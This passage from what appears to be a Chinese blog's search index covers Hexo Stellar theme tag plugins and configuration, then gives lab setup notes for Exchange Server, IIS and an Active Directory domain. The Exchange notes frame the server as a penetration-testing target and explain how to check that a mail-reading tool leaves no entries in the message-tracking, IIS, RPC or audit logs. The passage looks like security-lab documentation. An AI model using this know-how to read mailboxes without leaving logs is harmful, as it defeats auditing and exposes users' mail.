red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。一共支持12种颜色，可以满足几乎所有的需求了。color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。12345678910111213141516171819202122&#123;% note 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:red 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:orange 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:yellow 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:green 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:cyan 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:blue 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:purple 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:light 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:dark 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:warning 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125;&#123;% note color:error 一共支持12种颜色，可以满足几乎所有的需求了。 color 可设置 red、orange、yellow、green、cyan、blue、purple、light、dark、warning、error 几种取值。 %&#125; timeline 时间线 静态数据是写死在 md 源文件中的，在 deploy 时就已经确定了。 效果写法2021 年 2 月 16 日主要部分功能已经开发的差不多了。2021 年 2 月 11 日今天除夕，也是生日，一个人在外地过年+过生日，熬夜开发新主题，尽量在假期结束前放出公测版。123456&#123;% timeline %&#125;&lt;!-- node 2021 年 2 月 16 日 --&gt;主要部分功能已经开发的差不多了。&lt;!-- node 2021 年 2 月 11 日 --&gt;今天除夕，也是生日，一个人在外地过年+过生日，熬夜开发新主题，尽量在假期结束前放出公测版。&#123;% endtimeline %&#125; sites网站卡片 https://xaoxuu.com/wiki/stellar/tag-plugins/data/#sites-网站卡片 okr 目标管理 这个功能在 1.20.0 版本后开始支持 效果写法 O1 2024年的小目标：完成 Volantis 6.0 并发布上线 来自2025年的复盘：已《基本》实现目标 正常 44% KR1 重构 tag-plugins 和 wiki 系统 当 KR 进度为 100% 时，标签默认显示为 已完成当 KR 未设置进度时，默认为 0%当 O 未设置进度时，则显示所有 KR 进度平均值 已完成 100% KR2 完成主要页面设计稿 小提示1小提示2您可以在 _config.yml 文件中修改标签的颜色和文案您可以在 _config.yml 文件中增加任意的标签配置 延期 90% KR3 完成前置准备工作（如果你知道答案，请在留言区帮帮我！🥹） 在咸水和海滩之间找一亩地求出圆周率后15位找出宇宙的终极逻辑去地狱里走两步 未完成 -12% KR-4 开发、测试和发布 支持嵌套插入图片等其它简单组件 风险 0% 123456789101112131415161718192021222324252627282930313233&#123;% okr o1 %&#125;2024年的小目标：完成 Volantis 6.0 并发布上线来自2025年的复盘：已《基本》实现目标 &#123;% emoji tieba 滑稽 %&#125;&lt;!-- okr kr1 percent:1 --&gt;重构 tag-plugins 和 wiki 系统- 当 &#123;% mark KR %&#125; 进度为 100% 时，标签默认显示为 &#123;% mark color:green 已完成 %&#125;- 当 &#123;% mark KR %&#125; 未设置进度时，默认为 &#123;% mark 0% %&#125;- 当 &#123;% mark O %&#125; 未设置进度时，则显示所有 &#123;% mark KR %&#125; 进度平均值&lt;!-- okr kr2 percent:0.9 status:off_track --&gt;完成主要页面设计稿&#123;% tabs align:left %&#125;&lt;!-- tab 小提示1 --&gt;您可以在 _config.yml 文件中修改标签的颜色和文案&lt;!-- tab 小提示2 --&gt;您可以在 _config.yml 文件中增加任意的标签配置&#123;% endtabs %&#125;&lt;!-- okr kr3 percent:-0.12 status:unfinished --&gt;完成前置准备工作（如果你知道答案，请在留言区帮帮我！🥹）&#123;% checkbox 在咸水和海滩之间找一亩地 %&#125;&#123;% checkbox 求出圆周率后15位 %&#125;&#123;% checkbox 找出宇宙的终极逻辑 %&#125;&#123;% checkbox 去地狱里走两步 %&#125;&lt;!-- okr kr-4 status:at_risk --&gt;开发、测试和发布&#123;% image /assets/wiki/stellar/icon.svg height:64px 支持嵌套插入图片等其它简单组件 %&#125;&#123;% endokr %&#125; tabs分栏容器 这个标签移植自 NexT 主题，但做了以下修改： 支持设置 align:center 来使内容居中 设置默认激活的标签方式为 active:1 而非 , 1（使用默认格式降低学习成本，且显式声明可读性更强） 不需要 &lt;!-- endtab --&gt; 来作为结束标识（因为 Stellar 会自动判断） 不需要 tabs id 来保证唯一性（因为 Stellar 会设置唯一标识） 不支持 @icon 方式设置图标（因为 Stellar 不再内置 fontawesome 图标库） 轮廓样式简化，可以搭配其它容器类标签嵌套使用。 效果写法图片代码块表格12let x = 123print(&quot;hello world&quot;) a b c a1 b1 c1 a2 b2 c2 1234567891011121314151617181920&#123;% tabs active:1 align:center %&#125;&lt;!-- tab 图片 --&gt;&#123;% image /assets/wiki/stellar/photos/hello@1x.png width:300px %&#125;&lt;!-- tab 代码块 --&gt;```swiftlet x = 123print(&quot;hello world&quot;)```&lt;!-- tab 表格 --&gt;| a | b | c || ---- | ---- | ---- || a1 | b1 | c1 || a2 | b2 | c2 |&#123;% endtabs %&#125;"},{"title":"解读Stellar主题功能","path":"/wiki/stellar/解读Stellar主题功能.html","content":"这篇文章对Stellar主题的特色功能进行解读，并指明本博客使用用途。 post，Wiki，专栏 post 大部分博客都是post，就是文章。 Wiki Stellar独创了其它Hexo主题所没有的Wiki文档系统（另一个博客主题Volantis也有wiki，同一个开发者移植的）。在wiki的项目中，可以生成一个目录树，还可以手动指定顺序、标题、分组，而非依赖文件路径、文件名来排序和显示。 老版wiki和新版wiki对比分类老版wiki用Setions的数字作为分类区间，当wiki的一个project下文章较多时可能会出现重新对front-matter中order字段重新编号的情况新版直接就是直接在project.yml里toc字段的-‘md文件名’，-的顺序就是文章排列顺序新版wiki需要在\\source_data\\wiki.yml中将项目「上架」，不上架在wiki页面就不显示（但实际上可以通过手动输URL访问到），相当于wiki多了草稿功能，不上架（wiki页面不显示），实际页面还是渲染了成html了小结：个人觉得，1.20.0版以上的wiki会更方便些，建议使用1.20.0版以上的wiki 专栏 Stellar1.25.0版本后新增了专栏功能。开发者xaoxuu的建议是：「话题/专栏」作为「分类」和「标签」之外对分章检索的一个补充维度。 个人使用 功能 Post Wiki 专栏 官方建议用途 普通的文章 wiki知识库/产品文档 同一话题下的多篇文章 md文章放置路径 _post文件夹下 wiki/project/下 _post文件夹下 手动排序 ❌，可以通过置顶顺序、发布时间来调整，但没那么方便 ✔️ ❌ toc-文章分组 ❌ ✔️ ❌ 是否支持标签检索 ✔️ ✔️对项目的标签检索 ✔️ 本质 普通的文章 归属在同一project的文章 也是post；对post文章检索的补充维度 网页显示页面 Blog页面 wiki页面 Blog页面的专栏tag 根据post、wiki、专栏的特点，得出俺使用的用途 post： 零散文章 wiki： 知识库 有先后顺序，强联系的文章集合 能进行明显的分类 展示价值弱的文章集合（因为专栏文章也会出现在post，如果post处高价值文章少显得整体质量差） 专栏： 隶属于同一话题，离散的无先后顺序的文章集合 不便进行分类的文章集合 文章结合弄成专栏还是Wiki，是综合考虑排序、展示价值、分类等因素，界面也没划得那么清晰，暂且这么分 标签组件语法 之前使用butterfly主题博客，迟迟没换主题的原因是标签组件语法实在太好用了，能为文章内容表达展示添色许多 表达类标签组件（19+个） 容器类标签组件（11个）"},{"title":"配置和改动记录","path":"/wiki/stellar/配置和改动记录.html","content":"这篇文章记录对Stellar主题的改动，包括：配置项信息的记录，不涉及源代码的调整和源代码修改。 配置记录 _config.yml 修改了Site信息，URL改动（为了设置post文章文章永久链接） _config.stellar.yml 改下menu(侧边栏主功能导航菜单)，Footer， _config.stellar.yml123456789# 侧边栏主功能导航菜单# 自己可以增加任意的键值对# 键：就是 menu_id，后面需要用到# 值：就是显示的 md 链接，方括号内支持文字和图片标签menu: post: &#x27;[btn.blog](/)&#x27; wiki: &#x27;[btn.wiki](/wiki/)&#x27; friends: &#x27;[友链](/friends/)&#x27; about: &#x27;[关于](/about/)&#x27; site_tree 修改了page的sidebar，为了让about页面不显示toc 后续要新增page的话，这里需要做修改 （自己新增一个aboutpage+sidebar，发现不生效） 1234567######## Main ######### 站点主结构树site_tree: # 其它自定义页面配置 layout: page page: # sidebar: toc, search sidebar: search front-matter模板 参考：编写文章以及独立页面 博客根目录\\scaffolds\\文件夹下放置的是md模板，俺的配置如下： \\scaffolds\\post.md1234567891011---title: &#123;&#123; title &#125;&#125;description: tags: []categories: []cover: banner: typora-root-url: ../date: &#123;&#123; date &#125;&#125;updated: &#123;&#123; date &#125;&#125;--- 未来可能有用的字段1234567---poster: # 海报（可选，全图封面卡片） topic: 标题上方的小字 # 可选 headline: 大标题 # 必选 caption: 标题下方的小字 # 可选 color: 标题颜色 # 可选--- 因为单独的page用得少，就将page.md做为在wiki-project下的md模板 \\scaffolds\\page.md12345678---layout: wiki # 使用wiki布局模板wiki: stellar #这是项目名，生成后需要修改title: &#123;&#123; title &#125;&#125;typora-root-url: ../date: &#123;&#123; date &#125;&#125;updated: &#123;&#123; date &#125;&#125;--- 如果需要新建page，手建md，front-matter改为： 独立页面.md123456---menu_id: more # 生成后需要修改title: 关于date: &#123;&#123; date &#125;&#125;updated: &#123;&#123; date &#125;&#125;--- 独立页面 about的index.md的front-matter中menu_id用于在导航栏高亮，menu_id和_config.stellar.yml文件中的menu下的字段对应 参考：https://xaoxuu.com/wiki/stellar/pages/#更多的独立页面 index.md123---menu_id: about--- wiki 文件组织 stellar与其他主题博客不同的是，额外具有wiki一栏。所以写作者的md文章可以放到_post文件夹或wiki/下。 俺看了开发者以及一些使用Stellar主题的人，wiki/下的文件组织都如图： 1234567891011121314151617181920wiki:. │ index.md │ ├─project1 │ │ index.md │ │ │ ├─章节1 │ │ index.md │ │ │ └─章节2 │ index.md │ └─project2 │ index.md │ ├─章节1 │ index.md │ └─章节2 index.md 在index.md中放入正文，且front matter指出wiki是哪个project。 经尝试，我发现： project里如果没有index.md是没有关系的 是否有章节1、章节2这个文件夹也是没关系的。 只要md的front matter要指出wiki是隶属于哪个project即可。 因此，考虑移植性+本地图片存放形式，我将wiki中的所有md文件都组织如下： 12345678wiki:. ├─project1 │ 文章1.md │ 文章2.md │ └─project2 文章1.md 文章2.md 配置并使用 1.19.0版本以前，和，1.20.0版本以后的wiki方式不同。1.26.0版本以后wiki配置字段有变化：path改为base_dir，sidebar分leftbar和rightbar。（不完全准确） 1.19.0版本以前[1.20.0，1.25.0]参考：https://sumorio.com/wiki/Hexo/303filesystem-sidebar.html 文件树结构1234567891011source:. ├─wiki │ └─stellar │ Stellar搭建和部署.md │ 配置和改动记录.md │ ├─_data │ projects.yml │ └─_post hello-world.md source/_data/projects.yml文件里是所有项目的描述信息 项目ID名需要唯一 Sections是分类和对应的区间。在md文章中可以通过区间的数字设置文章分到哪个类别中 \\source\\_data\\projects.yml12345678910111213141516171819202122######## stellar ########stellar: # 项目ID名 name: Stellar title: Stellar - 建站记录 #subtitle: &#x27;每个人的独立博客 | Designed by xaoxuu&#x27; tags: 其他 cover: false #logo: #src: /assets/wiki/stellar/icon.svg #small: 112px #large: 240px #description: Stellar 是一个内置 wiki 系统的 hexo 主题，适合综合型站点使用。同时也拥有简约而精美的视觉设计和丰富的标签插件，帮助您简单从容地应对各种场合。 description: 记录Stellar主题博客搭建时的配置，改动和常用命令。 #repo: xaoxuu/hexo-theme-stellar #comment_title: &#x27;评论区仅供交流，有问题请提 [issue](https://github.com/xaoxuu/hexo-theme-stellar/issues) 反馈。&#x27; #giscus: #data-repo: xaoxuu/hexo-theme-stellar #data-mapping: number #data-term: 226 sections: &#x27;Hexo&#x27;: [0, 10] &#x27;Stellar&#x27;: [11, 20] md文件 md文件放在source/wiki/项目ID下。以stellar项目的文档为例，放在source/wiki/stellar下。 md的front-matter layout的值固定为wiki，表示用wiki渲染此md wiki指明项目ID title：文章标题 order：归属区间，分到哪个类别。3，分到Hexo类别中 可选字段 1234567---breadcrumb: false# 表示本页面不显示顶部导航，如果你需要显示的话，把这一行删除即可comments: false#表示本页面不启用评论版块，需要启用评论板块的话把值改成true--- 123456---layout: wikiwiki: stellartitle: 备份与升级order: 3--- 参考：https://blog.bxzdyg.cn/p/使用Hexo和Stellar搭建个人博客网站/#1-19-0-1 文件树结构1234567891011121314source: ├─wiki │ └─stellar │ Stellar搭建和部署.md │ 配置和改动记录.md │ ├─_data │ │ wiki.yml │ │ │ └─wiki │ stellar.yml │ └─_posts hello-world.md 创建项目描述文件 \\source\\_data\\wiki\\下的xx.yml是各个项目的描述信息文件。xx.yml中的内容是项目描述信息，文件名xx是项目的id。以 stellar项目为例： \\source\\_data\\wiki\\stellar.yml1234567891011121314151617181920212223242526272829name: Stellar # 进入wiki文章左上角的名字title: Stellar - 建站记录# subtitle: &#x27;很开心的学了 | 结果又多了一个学过而不会的技术&#x27; # 项目中和主页相似的两个副标题tags: 其他# icon: /assets/wiki/stellar/icon.svg # 封面页大图# cover: /assets/wiki/stellar/icon.svg # 列表页图标# coverpage: [logo, description]coverpage: false # 默认是 truedescription: Stellar主题博客建站记录，包括：搭建、配置、部署、备份、升级，特色功能个人理解，还有日常工作流，标签组件语法记录。# repo: xaoxuu/hexo-theme-stellarsidebar: - search: override: search filter: /wiki/stellar/ placeholder: &#x27;在/wiki/stellar/中搜索...&#x27; - toc # - timeline_stellar_releases - related# comment_title: &#x27;评论区仅供交流，有问题请提 [issue](https://github.com/xaoxuu/hexo-theme-stellar/issues) 反馈。&#x27;# comments:# service: giscus# giscus:# data-repo: xaoxuu/hexo-theme-stellar# data-mapping: number# data-term: 226path: /wiki/stellar/toc: - &#x27;Stellar搭建和部署&#x27; - &#x27;配置和改动记录&#x27; 设置布局模板和项目名称 在md文档的front-matter部分指定所属的项目id（上一步创建的文件名id.yml） wiki: stellar字段表明此md属于wiki的stellar项目 layout：wiki是使用wiki渲染此md （一般在wiki\\下创建一样的文件夹便于分类，其实只要md的front-matter指明了wiki字段属于哪个项目即可） \\source\\wiki\\stellarStellar搭建和部署.md12345---layout: wikiwiki: stellar # 这是项目id，对应 /data/wiki/stellar.ymltitle: 配置和改动记录--- 将此项目「上架」 blog/source/_data/wiki.yml文件中写入需要显示的项目id： \\source\\_data\\wiki.yml1- stellar 这样在项目列表（wiki）页面就可以看到刚刚创建的项目了 专栏 参考链接🔗：https://xaoxuu.com/wiki/stellar/topic.html 创建一个专栏 在 blog/source/_data/ 文件夹中创建一个 topic 文件夹，在其中放入各个专栏的描述文件，文件名就是项目的 id： blog/source/_data/topic/id.yml1234name: Stellar # 在面包屑导航上会显示较短的名字title: Stellar - 每个人的独立博客 # 在列表页会显示完整的专栏标题description: 关于搭建独立博客相关的知识和经验分享，以及 Stellar 的高级用法、版本更新相关的注意事项。order_by: -date # 默认是按发布日期倒序排序 发布文章 在此专栏文章的 md 文件的 front-matter 部分指定所属的专栏 id （即上一步创建的文件名 id.yml） blog/source/_posts/20240114.md123456---title: 这是文章标题topic: id # 这是专栏id，对应 blog/source/_data/topic/id.yml---文章正文 俺用的1.25.0，还需要在md中加上layout: topic在专栏文章侧边栏才会显示属于同一专栏下的文章 如果一篇专栏文章的md中没有标题，左侧会多出最近更新来补空白。专栏文章左侧专栏文章集合和最近更新样式相近，为了清晰，最好在md里至少加上一个标题 md与博客图片的处理 采用本地图片 文件树结构12345678source:. ├─wiki │ └─stellar │ 1.md │ └─_post └─blog 1.md 设置typora图像复制的路径为 typora图像复制路径1../../Typora_images/$&#123;filename&#125; md文章的front-matter xx.md123---typora-root-url: ../--- troubleshooting:网页图片未显示 复现情况好像都是：电脑放着系统自动更新重启后第一次执行hexo clean &amp;&amp; hexo s -p 5000网页就不显示出图片。 解决办法：关掉，重新执行几次。或关电脑💻，过段时间开 非源码改动 渲染数学公式 参考：https://blog.csdn.net/subtitle_/article/details/130004464 安装和卸载相关的npm包 1npm uninstall hexo-renderer-marked --save 1npm install hexo-renderer-markdown-it-plus --save 全局启用 _config.stellar.yml12345678910# Katex - The fastest math typesetting library for the web# https://katex.org/docs/autorender.html# https://github.com/KaTeX/KaTeX# 使用 hexo-renderer-markdown-it-plus 作为公式渲染器：npm uninstall hexo-renderer-marked --save npm install hexo-renderer-markdown-it-plus --savekatex: # set &lt;katex: true&gt; to enable in page&#x27;s front-matter enable: true min_css: &lt;link rel=&quot;stylesheet&quot; href=&quot;https://gcore.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css&quot; integrity=&quot;sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0&quot; crossorigin=&quot;anonymous&quot;&gt; min_js: &lt;script defer src=&quot;https://gcore.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js&quot; integrity=&quot;sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt; auto_render_min_js: &lt;script defer src=&quot;https://gcore.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js&quot; integrity=&quot;sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05&quot; crossorigin=&quot;anonymous&quot;onload=&quot;renderMathInElement(document.body);&quot;&gt;&lt;/script&gt; 指定page启用（1.25.0俺是这种方式） 在md的front-matter用katex: true来启用 1.26.2版本以后katex、mathjax、mermaid支持在配置文件中设置全局开启 复杂的 Markdown 表格（试了，没渲染出来） ~~参考：https://www.panoshu.top/blog/2c3f9e38/#fu-za-de-markdown-biao-ge~~ 1npm i markdown-it-multimd-table --save 在站点配置文件_config.yml中增加markdown-it的插件配置 _config.yml12345678plugins: - plugin: name: markdown-it-multimd-table enable: true options: multiline: false rowspan: true headerless: false 最后解决办法：用HTML语言 文章永久链接 参考：https://www.heson10.com/posts/31426.html（已停站） Hexo博客指南|第四篇:永久链接之abbrlink hexo-abbrlink-github仓库 这里指的是post文章的链接，wiki的没法弄成永久链接 安装npm包 1npm install hexo-abbrlink --save 修改_config.yml关于permalink的配置 _config.yml123456789# permalink: :year/:month/:day/:title/permalink: posts/:abbrlink.html # 此处可以自己设置，也可以直接使用 :/abbrlinkabbrlink: alg: crc32 #算法： crc16(default) and crc32 rep: hex #进制： dec(default) and hexpermalink_defaults:pretty_urls: trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks 关闭网页中图片下方的图片文件名 1.22.1不再支持 parse_markdown: true 来将 ![]() 替换成 &#123;% image xxx %&#125; 因为stellar自动将md中的图片转成图片标签，所以会带图片描述名，关掉这个转换 _config.stellar.yml1234# &#123;% image %&#125;image: fancybox: false # true, false parse_markdown: false # 把 markdown 格式的图片解析成图片标签 方法二：md里图片的[]就是描述，不写就行 源码改动 正文显示宽度 720px改成900px node_modules/hexo-theme-stellar/source/css/_custom.styl1234:root --width-left: 288px // Adjust this to increase/decrease the sidebar width // --width-main: 720px --width-main: 900px // Adjust this to increase/decrease the main content width"},{"title":"Exchange邮箱服务器","path":"/wiki/windows_env/Exchange邮箱服务器.html","content":"iso下载 参考链接🔗 备注 www.msexchangeupdates.com 多个Exchange Server版本的下载链接 Exchange 2019 cu7和cu8都跳转到了Microsoft Volume Licensing Center页面，没试过注册 环境搭建 Exchange 2016Exchange 2019 参考链接🔗： https://saucer-man.com/information_security/748.html#cl-3 Exchange CVE-2021-34473 - Colin.B - 博客园 (cnblogs.com) 官方文档链接是https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2016 安装的server2016机器需要是域成员，用户要么是域管，要么是域理组用户（这也是为什么内网渗透时如果拿Exchange，和拿了域管差不多），装邮箱服务器内存至少8GB 偷懒的话将server2016提升为DC，域管账户登录，然后开始装Exchange2016 解压Exchange server.iso执行setup.exe前要装一些依赖组件 NET Framework 4.8 安装Visual C++ Redistributable Package for Visual Studio 2012 Visual C++ 2013 Redistributable Package 通过Power Shell安装Exchange必备的Windows组件 1Install-WindowsFeature Server-Media-Foundation, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS 解压exchange 2016 ios双击setup程序 解决出现的错误，根据链接装相应的程序 serve2016r可能需要打一个补丁，根据链接下载这个补丁 要装个Unified Communications Managed API 4.0 Runtime 参考链接🔗：https://learn.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2019&amp;source=recommendations 步骤和2016的一样，检查，可能的报错： 需要重启，那就重启The computer needs to be restarted before Setup can continue [RebootPending] 要装个Unified Communications Managed API 4.0 Runtime warning可以忽略，点击Install开始安装 登录网址 用户登录邮箱的网址：Outlook Web App (OWA): https://&lt;你的域名&gt;/owa 管理员后台网址：Exchange 管理中心 (EAC): https://&lt;你的域名&gt;/ecp 其他相关的可以登录后台的网址可能包括： Exchange 管理控制台 (EMC)：这是Exchange 2010的管理工具，Exchange 2016通常使用EAC。 Exchange 管理 Shell：这是一个基于PowerShell的命令行界面，用于管理Exchange Server。 关于邮件存储的问题，当用户1从邮箱界面发送邮件给用户2时，邮件会经过Exchange的传输服务，并最终存储在数据库中。Exchange Server使用一个叫做Exchange 数据库 (EDB) 的文件来存储所有的邮箱数据，包括邮件、日历条目、任务和其他邮箱对象。 日志 在Exchange Server中，邮件访问和传输的日志信息通常可以在以下位置找到： 消息跟踪日志 - 这些日志记录了邮件通过Exchange传输管道的信息，可以用来跟踪邮件的流动。默认情况下，这些日志位于以下路径： 1C:\\Program Files\\Microsoft\\Exchange Server\\V15\\TransportRoles\\Logs\\MessageTracking IIS日志 - 对于通过OWA或EAS（Exchange ActiveSync）访问的邮件，相关的HTTP请求会被记录在IIS日志中。这些日志通常位于以下路径： 1C:\\inetpub\\logs\\LogFiles RPC 客户端访问日志 - 对于通过MAPI/HTTP或RPC/HTTP访问的邮件，相关的日志会被记录在RPC 客户端访问日志中。这些日志通常位于以下路径： 1C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\RPC Client Access 审计日志 - 如果启用了邮箱审计日志，那么对邮箱的操作（如登录、读取邮件等）会被记录下来。这些日志可以通过Exchange 管理中心（EAC）或Exchange 管理 Shell访问。 如果想证明工具在不产生日志的情况下获取到了邮件，需要检查上述日志文件，确认在运行工具的时间段内没有相关的日志记录被生成。需要注意的是，如果工具是直接读取EDB文件，而不是通过Exchange的正常邮件访问流程，那么可能不会在消息跟踪日志或IIS日志中留下记录。但是，如果工具以某种方式模拟了用户访问，那么可能会在RPC客户端访问日志或审计日志中看到相关记录。"},{"title":"IIS","path":"/wiki/windows_env/IIS.html","content":"安装IIS 不需要server版 控制面板-程序和功能-启用或关闭Windows功能 不同系统版本勾选的不一样，不需要连网，安装完成后按照提示重启 安装好后可以搜到IIS 然后可以用浏览器访问装了IIS的这台电脑ip:80 日志 日志的显示可能有延迟 What is IIS chatGPT4 待再次组织整理 Q：什么是IIS，IIS的应用场景是什么，在该场景中数据的交互过程是怎样的。为什么会诞生IIS，IIS解决了哪些问题 A： IIS（Internet Information Services，互联网信息服务）是一个用于Windows服务器操作系统的Web服务器和应用程序服务器。它最初是为了扩展Windows NT 3.51的网络功能而设计的。IIS提供了一种创建、配置和管理Web站点、应用程序和服务的方式，它支持HTTP、HTTPS、FTP、FTPS、SMTP等协议。 IIS的应用场景主要包括： 托管Web站点：可以为企业或个人创建、发布和维护Web站点，提供信息、服务或产品。 提供Web应用程序支持：通过IIS，开发者可以构建基于ASP.NET、PHP等编程语言的Web应用程序，并运行在服务器上。 创建和管理Web服务：IIS支持基于SOAP、RESTful等协议的Web服务，用于在不同平台和设备之间交换数据。 在IIS的应用场景中，数据交互的过程大致如下： 客户端（通常是Web浏览器）向服务器发送请求。 服务器接收到请求后，根据请求的URL，通过IIS进行路由和处理。 如果请求需要运行服务器端代码（例如ASP.NET或PHP），IIS会将请求传递给相应的处理程序（如.NET运行时或PHP解释器）。 服务器端代码执行完成后，IIS将处理结果（通常是HTML、CSS、JavaScript等静态文件）返回给客户端。 客户端浏览器解析和渲染收到的内容，显示给用户。 IIS的诞生和发展解决了以下问题： 提供了一个集成的、易于管理的Web服务器和应用程序服务器平台，使得在Windows服务器上部署Web应用变得更加简单。 提高了性能和稳定性：IIS不断优化，以提高对大量并发请求的处理能力和对系统资源的有效利用。 提供了安全性：IIS包含了多种安全措施，如SSL/TLS支持、身份验证和访问控制，以保护服务器和应用程序。 支持多种编程语言和平台：IIS允许开发者使用ASP.NET、PHP等编程语言开发Web应用，提高了开发灵活性。 总之，IIS是一个功能丰富、性能稳定的Web服务器和应用程序服务器，它在Web站点托管、Web应用程序和Web服务方面有广泛的应用。"},{"title":"域环境","path":"/wiki/windows_env/域环境.html","content":"安装域 准备一台windows server，安装前要： Administrator强密码 将当前机器设置为静态IP，DNS首选服务器设置为127.0.0.1 powershell方式安装手动方式安装 参考链接🔗 备注📕 最快的方式搭建域环境 Install Active Directory Domain Services (Level 100) github版，微软官方手册，如何用pw方式安装 Install Active Directory Domain Services (Level 100) msdn版，微软官方手册，如何用pw方式安装 管理员权限powershell 安装活动目录域服务角色Active Directory Domain Services (AD DS) 1Install-WindowsFeature -name AD-Domain-Services -IncludeManagementTools IncludeManagementTools参数：是在安装AD DS角色时，用来指定同时安装管理工具的。这个参数会安装包括Active Directory用户和计算机、组策略管理编辑器等在内的图形界面管理工具和命令行工具 导入AD DS部署模块 1Import-Module ADDSDeployment 在执行安装或配置Active Directory之前，需要导入AD DS部署模块。 调用Install-ADDSForest设置域的信息执行安装 123456789101112Install-ADDSForest `-CreateDnsDelegation:$false `-DomainMode &quot;WinThreshold&quot; `-DomainName &quot;mytest.local&quot; `-DomainNetbiosName &quot;MYTEST&quot; `-ForestMode &quot;WinThreshold&quot; `-DatabasePath &quot;C:\\Windows\\NTDS&quot; `-LogPath &quot;C:\\Windows\\NTDS&quot; `-SysvolPath &quot;C:\\Windows\\SYSVOL&quot; `-InstallDns:$true `-NoRebootOnCompletion:$false `-Force:$true CreateDnsDelegation：是否创建引用与域控制器一起安装的新DNS服务器的DNS委派。 仅对 Active Directory“集成 DNS 有效。默认值是根据环境自动计算的。 DomainMode：指定创建新林时第一个域的域功能级别。（域控系统版本必须≥域功能级别的系统版本） Windows Server 2003: 2 or Win2003 Windows Server 2008: 3 or Win2008 Windows Server 2008 R2: 4 or Win2008R2 Windows Server 2012: 5 or Win2012 Windows Server 2012 R2: 6 or Win2012R2 Windows Server 2016: 7 or WinThreshold DomainName：域名 DomainNetbiosName：域的Netbios名称 ForestMode与DomainMode等同，该选项主要用于尽可能的自动化 指定AD DS数据库、日志文件和SYSVOL的路径 DatabasePath LogPath SysvolPath InstallDns：是否安装DNS服务 NoRebootOnCompletion：不重启完成安装 命令方式安装与手动安装对应的地方日志路径对应手动安装的这里参考：Step-By-Step : How to install and configure Domain Controller on Windows Server 2019执行报错：因为本地管理员没密码或密码强度不够给本地管理员设密码，at least 8-14 characters long and include a combination of uppercase and lowercase letters, digits, and symbols.1net user Administrator &lt;password&gt; 运行后弹窗要输入SafeModeAdministratorPassword，这是指定Active Directory域控制器安全模式管理员密码的参数。在安装或配置域控制器时，系统会创建一个特殊的安全模式环境，称为“目录服务还原模式”（Directory Services Restore Mode, DSRM），用于进行维护、恢复或解决 AD DS 相关问题。在 DSRM 下登录需要一个特定的账户，即“安全模式管理员”，其权限允许对 AD 数据库进行更改和修复。 回车 pw回显有warning，不用理会 参考链接🔗 备注📕 搭建一个简单的Windows域环境 相关配置 域密码强度配置 安装DC重启后，是mytest/test用户登进的，想用域管就切换用mytest/administrator登录，密码是之前设的密码。 修改域管密码Win-Windows Administrative Tools-Active Directory Users and Computers 去掉密码强度策略，可以设置简单密码【全域策略生效】（要域管账号登进） 参考链接🔗 Windows域控去掉密码强度策略 